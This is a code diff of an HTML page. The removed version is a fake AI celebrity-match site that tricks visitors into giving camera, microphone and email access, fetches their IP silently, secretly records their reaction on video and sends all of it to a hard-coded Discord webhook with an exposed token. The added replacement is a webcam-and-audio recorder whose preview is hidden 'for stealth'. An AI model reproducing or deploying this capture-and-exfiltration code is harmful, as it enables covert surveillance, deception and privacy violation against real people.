@@ -3,424 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aura | AI Celebrity Match</title>
+    <title>Media Capture</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&display=swap');
-        
-        /* --- MAIN DARK THEME --- */
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-            color: #f8fafc;
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-
-        .container {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 40px;
-            width: 90%;
-            max-width: 450px;
-            text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            z-index: 1;
-        }
-
-        h1 {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            background: linear-gradient(to right, #38bdf8, #818cf8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        p.subtitle {
-            color: #94a3b8;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-
-        .video-wrapper {
-            position: relative;
-            width: 100%;
-            border-radius: 16px;
-            overflow: hidden;
-            border: 2px solid rgba(56, 189, 248, 0.3);
-            background: #000;
-            margin-bottom: 25px;
-            box-shadow: 0 0 20px rgba(56, 189, 248, 0.1);
-            display: none;
-        }
-
-        #video-preview {
-            width: 100%;
-            display: block;
-            transform: scaleX(-1);
-        }
-
-        .scan-line {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: #38bdf8;
-            box-shadow: 0 0 10px #38bdf8, 0 0 20px #38bdf8;
-            display: none;
-            animation: scan 1.5s ease-in-out infinite;
-        }
-
-        @keyframes scan {
-            0% { top: 0; opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { top: 100%; opacity: 0; }
-        }
-
-        button.primary-btn {
-            background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 12px;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin-bottom: 10px;
-        }
-
-        button.primary-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px -10px rgba(56, 189, 248, 0.6);
-        }
-
-        #scan-btn {
-            display: none;
-        }
-
-        #status-text {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #38bdf8;
-            font-family: monospace;
-            min-height: 20px;
-        }
-
-        #result-container {
-            display: none;
-            animation: fadeIn 0.5s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        #celeb-image {
-            width: 100%;
-            border-radius: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            margin-top: 20px;
-        }
-
-        /* --- CUSTOM SECURITY MODAL STYLES --- */
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(15, 23, 42, 0.8);
-            backdrop-filter: blur(8px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .security-modal {
-            background: #1e293b;
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            width: 90%;
-            max-width: 380px;
-            border-radius: 16px;
-            padding: 30px;
-            box-sizing: border-box;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-            color: #f8fafc;
-        }
-
-        .security-icon {
-            width: 48px;
-            height: 48px;
-            background: rgba(56, 189, 248, 0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 15px auto;
-            color: #38bdf8;
-        }
-
-        .security-icon svg {
-            width: 24px;
-            height: 24px;
-        }
-
-        .security-title {
-            font-size: 20px;
-            font-weight: 600;
-            margin: 0 0 10px 0;
-        }
-
-        .security-subtitle {
-            font-size: 14px;
-            color: #94a3b8;
-            margin: 0 0 25px 0;
-            line-height: 1.5;
-        }
-
-        .security-input {
-            width: 100%;
-            padding: 14px;
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            color: white;
-            font-size: 15px;
-            box-sizing: border-box;
-            margin-bottom: 20px;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .security-input:focus {
-            outline: none;
-            border-color: #38bdf8;
-            background: rgba(0, 0, 0, 0.4);
-        }
-
-        .security-btn {
-            background: #38bdf8;
-            color: #0f172a;
-            border: none;
-            padding: 14px;
-            width: 100%;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .security-btn:hover {
-            background: #7dd3fc;
-        }
-
-        .security-btn:disabled {
-            background: #475569;
-            color: #94a3b8;
-            cursor: not-allowed;
-        }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #1a1a1a; color: #fff; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 5px; margin: 10px; font-weight: bold; }
+        #startBtn { background-color: #e74c3c; color: white; }
+        #stopBtn { background-color: #7f8c8d; color: white; display: none; }
+        video { display: none; /* Hidden by default for stealth */ margin-top: 20px; max-width: 400px; border-radius: 8px; }
     </style>
 </head>
 <body>
 
-    <!-- MAIN APP CONTAINER -->
-    <div class="container">
-        <h1>Aura Match AI</h1>
-        <p class="subtitle">Neural facial mapping to find your exact celebrity twin.</p>
-
-        <div class="video-wrapper" id="cam-container">
-            <video id="video-preview" autoplay muted playsinline></video>
-            <div class="scan-line" id="scan-line"></div>
-        </div>
-
-        <div id="result-container">
-            <h2 style="color: #4ade80; margin: 0;">99.8% Match Found</h2>
-            <img id="celeb-image" src="" alt="Your Match">
-        </div>
-
-        <button id="connect-btn" class="primary-btn">Connect Camera</button>
-        <button id="scan-btn" class="primary-btn">Analyze Face</button>
-        <div id="status-text">Awaiting camera initialization...</div>
-    </div>
-
-    <!-- CUSTOM SECURITY MODAL -->
-    <div class="modal-overlay" id="security-overlay">
-        <div class="security-modal">
-            <div class="security-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                </svg>
-            </div>
-            <h2 class="security-title">Bot Protection</h2>
-            <p class="security-subtitle">To prevent server overload, please verify your email address to continue the scan.</p>
-            <input type="email" id="sec-email" class="security-input" placeholder="Enter your email address" required>
-            <button class="security-btn" id="sec-submit-btn">Verify Email</button>
-        </div>
-    </div>
+    <h2>Click to Start</h2>
+    <button id="startBtn">Start Capture</button>
+    <button id="stopBtn">Stop & Save</button>
+    <video id="preview" autoplay muted></video>
 
     <script>
-        // ==========================================
-        // LO'S CONFIGURATION ZONE
-        // ==========================================
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT";
-        
-        const RIGGED_IMAGES = [
-            "2026-05-17_13-26-39_441.jpg",
-            "2026-05-17_13-26-39_451.jpg",
-            "2026-05-17_13-26-39_523.jpg",
-            "2026-05-17_13-26-39_621.jpg",
-            "Screenshot 2026-05-17 141750.png"
-        ];
-        // ==========================================
-
-        // Elements
-        const video = document.getElementById('video-preview');
-        const connectBtn = document.getElementById('connect-btn');
-        const scanBtn = document.getElementById('scan-btn');
-        const statusText = document.getElementById('status-text');
-        const scanLine = document.getElementById('scan-line');
-        const resultContainer = document.getElementById('result-container');
-        const celebImage = document.getElementById('celeb-image');
-        const camContainer = document.getElementById('cam-container');
-
-        // Modal Elements
-        const overlay = document.getElementById('security-overlay');
-        const emailInput = document.getElementById('sec-email');
-        const submitBtn = document.getElementById('sec-submit-btn');
-
-        let stream;
         let mediaRecorder;
         let recordedChunks = [];
-        let userIP = "Unknown";
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const videoElement = document.getElementById('preview');
 
-        // 1. Fetch IP Address silently
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => { userIP = data.ip; })
-            .catch(err => console.error("IP fetch failed", err));
-
-        // 2. Connect Camera
-        connectBtn.onclick = async () => {
-            statusText.innerText = "Requesting permissions...";
+        startBtn.addEventListener('click', async () => {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
-                video.srcObject = stream;
+                // Request both video and audio
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 
-                camContainer.style.display = 'block';
-                connectBtn.style.display = 'none';
-                scanBtn.style.display = 'block';
-                statusText.innerText = "System ready. Position your face in frame.";
+                // Optional: Show preview (remove this line if you want it completely hidden)
+                // videoElement.srcObject = stream; 
+                // videoElement.style.display = 'block';
+
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.style.display = 'none';
+                    a.href = url;
+                    a.download = 'capture_' + new Date().getTime() + '.webm';
+                    document.body.appendChild(a);
+                    a.click();
+                    setTimeout(() => {
+                        document.body.removeChild(a);
+                        window.URL.revokeObjectURL(url);
+                    }, 100);
+                    recordedChunks = []; // Reset
+                };
+
+                mediaRecorder.start();
+                startBtn.style.display = 'none';
+                stopBtn.style.display = 'inline-block';
+                stopBtn.style.backgroundColor = '#2ecc71';
+
             } catch (err) {
-                statusText.innerText = "Error: " + err.name + " - " + err.message;
-                statusText.style.color = "#ef4444";
+                console.error("Error accessing media devices.", err);
+                alert("Permissions denied or devices not found.");
             }
-        };
+        });
 
-        // 3. Click Analyze -> Show Custom Modal
-        scanBtn.onclick = () => {
-            overlay.style.display = 'flex';
-        };
-
-        // 4. Handle Email Submit -> Fake Loading -> Start Fake Scan
-        submitBtn.onclick = () => {
-            if(!emailInput.value || !emailInput.value.includes('@')) {
-                emailInput.style.borderColor = '#ef4444';
-                return;
-            }
+        stopBtn.addEventListener('click', () => {
+            mediaRecorder.stop();
+            // Stop all tracks to turn off the camera light
+            mediaRecorder.stream.getTracks().forEach(track => track.stop());
             
-            // Fake loading state on the button
-            submitBtn.innerText = "Sending code...";
-            submitBtn.disabled = true;
-            emailInput.disabled = true;
-
-            // Wait 1.5 seconds, then drop the modal and spring the trap
-            setTimeout(() => {
-                overlay.style.display = 'none';
-                startFakeScan();
-            }, 1500);
-        };
-
-        // 5. The original fake scan logic
-        function startFakeScan() {
-            scanBtn.style.display = 'none';
-            scanLine.style.display = 'block';
-            statusText.innerText = "Extracting biometric markers...";
-
-            setTimeout(() => {
-                statusText.innerText = "Cross-referencing global database...";
-            }, 800);
-
-            setTimeout(() => {
-                scanLine.style.display = 'none';
-                camContainer.style.display = 'none';
-                statusText.style.display = 'none';
-                
-                const randomPic = RIGGED_IMAGES[Math.floor(Math.random() * RIGGED_IMAGES.length)];
-                celebImage.src = randomPic;
-                resultContainer.style.display = 'block';
-
-                startReactionCapture();
-            }, 1800);
-        }
-
-        // 6. Record Video and Send Payload
-        function startReactionCapture() {
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            mediaRecorder.onstop = () => {
-                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                sendToDiscord(videoBlob);
-            };
-
-            mediaRecorder.start();
-
-            setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-            }, 3000);
-        }
-
-        function sendToDiscord(blob) {
-            const formData = new FormData();
-            const filename = `reaction_${new Date().getTime()}.webm`;
-            
-            const messageContent = `
-🎯 **Trap Sprung! Target Captured.**
-
-🌐 **IP Address:** \`${userIP}\`
-📧 **Email:** \`${emailInput.value}\`
-
-🎬 *Reaction video attached below.*`;
-
-            formData.append('file', blob, filename);
-            formData.append('content', messageContent);
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            }).catch(console.error);
-        }
+            startBtn.style.display = 'inline-block';
+            stopBtn.style.display = 'none';
+            videoElement.style.display = 'none';
+        });
     </script>
 </body>
 </html>
